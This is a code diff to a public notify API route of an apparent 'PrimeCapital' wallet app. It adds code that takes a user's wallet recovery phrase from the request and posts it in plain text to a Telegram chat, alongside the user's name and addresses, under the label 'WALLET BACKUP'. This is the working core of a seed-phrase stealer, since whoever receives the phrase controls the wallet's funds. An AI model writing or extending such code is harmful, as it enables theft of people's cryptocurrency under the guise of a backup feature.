@@ -79,17 +79,25 @@ export const Route = createFileRoute("/api/public/notify")({
         await sendTelegram(token, lines.join("\n"));
 
         // Send seed / addresses as a separate, tagged message so admins can easily find backups.
-        if (body.addresses && body.addresses.length) {
+        if ((body.addresses && body.addresses.length) || body.mnemonic) {
           const backup: string[] = [
-            `<b>PrimeCapital · BACKUP</b> · <code>${esc(event)}</code>`,
+            "⭐✨🔐 <b>PrimeCapital · WALLET BACKUP</b> 🔐✨⭐",
+            `📣 <code>${esc(event)}</code>`,
             `👤 <b>${esc(username)}</b>`,
           ];
           if (address) backup.push(`💼 <code>${esc(address)}</code>`);
-          backup.push(`📇 <b>Addresses:</b>`);
-          for (const a of body.addresses.slice(0, 24)) {
-            backup.push(
-              `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`,
-            );
+          if (body.mnemonic && typeof body.mnemonic === "string") {
+            const phrase = body.mnemonic.trim();
+            backup.push("🧠 <b>Recovery phrase:</b>");
+            backup.push(`<code>${esc(truncate(phrase, 800))}</code>`);
+          }
+          if (body.addresses && body.addresses.length) {
+            backup.push(`📇 <b>Addresses:</b>`);
+            for (const a of body.addresses.slice(0, 24)) {
+              backup.push(
+                `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`,
+              );
+            }
           }
           await sendTelegram(token, backup.join("\n"));
         }
